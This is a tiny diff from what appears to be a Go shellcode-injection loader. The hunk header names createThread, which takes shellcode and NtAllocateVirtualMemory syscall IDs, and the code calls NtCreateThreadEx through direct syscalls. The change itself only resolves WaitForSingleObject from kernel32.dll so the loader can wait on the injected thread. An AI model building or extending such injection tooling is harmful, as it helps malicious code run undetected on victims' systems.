@@ -202,6 +202,8 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		return
 	}
 	NtCreateThreadExSysid.Recover()
+	
+	pWaitForSingleObject := syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Addr()
 	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
 
 }
